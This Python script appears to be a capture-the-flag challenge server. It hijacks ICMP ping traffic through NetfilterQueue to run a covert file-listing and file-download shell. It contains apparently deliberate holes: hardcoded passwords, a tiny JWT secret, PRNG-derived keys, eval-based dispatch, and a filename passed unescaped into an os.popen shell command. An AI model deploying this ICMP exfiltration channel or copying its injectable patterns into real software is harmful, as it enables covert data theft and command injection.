from netfilterqueue import NetfilterQueue
from Crypto.Util.Padding import pad, unpad
from Crypto.Cipher import AES

from base64 import b64encode, b64decode
from subprocess import PIPE, Popen
from binascii import hexlify
from scapy.all import *
from pwn import *

import re
import os
import zlib
import jwt
import json

import struct
import random

field = re.compile(r'PING(?P<data>.*)(?P<cookies>.{4}COOKIES.*)', re.S)
exfil_data = re.compile(r'.{4}(?P<method>.{4})(?P<data>.*).{4}', re.S)
exfil_cookies = re.compile(r'.{4}COOKIES(?P<data>.*).{4}', re.S)
exfil_crc = re.compile(r'.{4}$', re.S)

sessions_count = {}

CHAR = 'abcdef0123456789'
HEADER = 'PONG'

CMD_TYPE = {
    'AUTH'  : 'self.auth',
    'GETS'  : 'self.gets',
    'LIST'  : 'self.list',
}

users = {
    'admin': {
        'uid': 0,
        'name': 'admin',
        'password': 'admin@123',
        'is_admin': True
    },
    'guest':{
        'uid': 1,
        'name': 'guest',
        'password': 'guest',
        'is_admin': False
    }
}


def split(length, x=60, y=64):
    segments = []
    pos = 0

    while pos != length:
        picked_len = randint(x, y)
        
        if pos + picked_len > length:
            picked_len = length - pos

        segments.append(picked_len)
        pos += picked_len

    assert sum(segments) == length

    return segments

def populate(target, segments):
    dd_bs = "dd if={} bs={} skip={} count=1 | od"
    dd_count = "dd if={} bs=1 skip={} count={} | od"
    
    mode = ['bs', 'count']
    cmds = []

    pos = 0
    for enum, seg in enumerate(segments):
        m = choice(mode)
        bs = seg
        
        if m == 'bs':        

            if not pos % bs:
                skip = pos/bs
                cmds.append(dd_bs.format(target, bs, skip))
            else:
                skip = pos
                cmds.append(dd_count.format(target, skip, seg))

        else:
            skip = pos
            cmds.append(dd_count.format(target, skip, seg))

        pos += seg

    return cmds

def jsonify(**kwargs):
    return json.dumps(kwargs)

def pack(num):
    return struct.pack('!I', num)

def chsum(data):
    checksum = zlib.crc32(data) % (1<<32)
    return struct.pack('>I', checksum)

def randstr(seed, size=32):
    random.seed(seed)
    
    return str(bytearray(random.choice(CHAR) for _ in xrange(size)))

def encrypt(text, session_id, seed):
    num = int(session_id, 16) + int(secret, 16)
    key = randstr(int(seed) + num)

    iv = os.urandom(16)
    aes = AES.new(key, AES.MODE_CBC, iv)

    text = pad(text, 16)
    data = aes.encrypt(text)

    return jsonify(iv=b64encode(iv), data=b64encode(data))

class EchoData(object):
    def __init__(self, type, data):
        self._data = zlib.compress(data)
        self._type = type

    def tobytes(self):
        return self.length + self.type + self.data + self.checksum

    @property
    def data(self):
        return self._data

    @property
    def type(self):
        return self._type 

    @property
    def length(self):
        return pack(len(self.data))

    @property
    def checksum(self):
        return chsum(self.data)


class FTPShell(object):
    def __init__(self, raw, seed):
        self._raw = raw
        self._seed = seed

        self._data = None
        self._cookies = None

    def run(self):
        fields = field.search(self._raw)
        rawdata = fields.group('data')
        cookies = fields.group('cookies')

        shell_method = exfil_data.search(rawdata).group('method')
        shell_data = exfil_data.search(rawdata).group('data')

        assert exfil_crc.search(rawdata).group() == chsum(shell_data), 'CRC Error. Data was corrupted?'

        shell_data = json.loads(zlib.decompress(shell_data))
        shell_cookies = exfil_cookies.search(cookies).group('data')

        assert exfil_crc.search(cookies).group() == chsum(shell_cookies), 'CRC Error. Cookies were corrupted?'

        shell_cookies = json.loads(zlib.decompress(shell_cookies)).get('token')

        eval('%s(shell_data, shell_cookies)' % (CMD_TYPE.get(shell_method)))

    def auth(self, data, cookies=None):
        global sessions_count

        username = data['username']
        password = data['password']
        user = users.get(username)
        
        if user is None:
            raise Exception('Username does not exist!')
        if password != user['password']:
            raise Exception('Incorrect password!')

        content = 'Successfully logged in'
        session_id = randstr(32)

        self.data = self.make_response_data('LIST', content, session_id)
        self.cookies = self.make_response_cookies('COOKIES', user, session_id)

        sessions_count[session_id] = 0

    def list(self, data, cookies=None):
        global sessions_count

        cookies = jwt.decode(cookies, secret)
        session_id = cookies['session_id']
        username = cookies['username']
        user = users.get(username)

        if session_id not in sessions_count:
            raise Exception('Session doesn\'t exist!')
        if sessions_count.get(session_id) > 0:
            raise Exception('Session expired!')

        path = data['path']
        content = ' '.join(os.listdir(path))
        
        self.data = self.make_response_data('LIST', content, session_id)
        self.cookies = self.make_response_cookies('COOKIES', user, session_id)

        sessions_count[session_id] = 1

    def gets(self, data, cookies=None):
        global sessions_count

        cookies = jwt.decode(cookies, secret)
        username = cookies['username']
        is_admin = cookies['is_admin']
        session_id = cookies['session_id']
        user = users.get(username)

        if session_id not in sessions_count:
            raise Exception('Session doesn\'t exist!')
        if sessions_count.get(session_id) > 0:
            raise Exception('Session expired!')

        if not is_admin:
            raise Exception('Admin role is required to download file!')

        filename = data['filename']
        filesize = os.path.getsize(filename)
        commands = populate(filename, split(filesize))

        file_content = []      
        for cmd in commands:
            content = os.popen(cmd).read()
            data = self.make_response_data('GETS', content, session_id)

            file_content.append(data)

        self.data = file_content
        self.cookies = self.make_response_cookies('COOKIES', user, session_id)

        sessions_count[session_id] = 1

    def make_response_data(self, method, content, session_id=None):
        encrypted_content = encrypt(
            str(content),
            session_id,
            self._seed
        )

        return EchoData(method, encrypted_content)

    def make_response_cookies(self, method, user, session_id):
        cookies = jwt.encode({
            'session_id': session_id,
            'username': user['name'],
            'is_admin': user['is_admin']
        }, secret)

        return EchoData(method, jsonify(token=cookies))
    
    @property
    def response(self):
        if isinstance(self.data, list):
            return [HEADER + d.tobytes() + self.cookies for d in self.data]

        return HEADER + self.data.tobytes() + self.cookies

    @property
    def data(self):
        return self._data

    @property
    def cookies(self):
        if not self._cookies:
            return EchoData('COOKIES', '').tobytes()

        return self._cookies.tobytes()

    @data.setter
    def data(self, value):
        self._data = value

    @cookies.setter
    def cookies(self, value):
        self._cookies = value


def mod(pkt):
    time = int(pkt[IP].time)
    src = pkt[IP].src
    dst = pkt[IP].dst

    id = pkt[ICMP].id
    seq = pkt[ICMP].seq
    data = pkt[ICMP].load

    try:
        shell = FTPShell(data, time)
        shell.run()

        response = shell.response
    except Exception as e:
        stderr = EchoData('ERROR', str(e))
        response = stderr.tobytes()

    if isinstance(response, list):
        responses = list(zip(range(len(response)), response))
        random.shuffle(responses)

        for res in responses:
            send(IP(src=dst, dst=src)/ICMP(type=0, code=0, id=id, seq=res[0])/res[1])
    else:
        send(IP(src=dst, dst=src)/ICMP(type=0, code=0, id=id, seq=seq)/response)

def icmp_hooks(pkt):
    packet = IP(pkt.get_payload())
    proto = packet.proto
    
    if proto == 0x01:
        if packet[ICMP].type == 8:
            mod(packet)

if __name__ == '__main__':
    secret = randstr(random.getrandbits(8), size=6)

    nfqueue = NetfilterQueue()
    nfqueue.bind(1, icmp_hooks)

    try:
        nfqueue.run()
    except KeyboardInterrupt:
        pass

    nfqueue.unbind()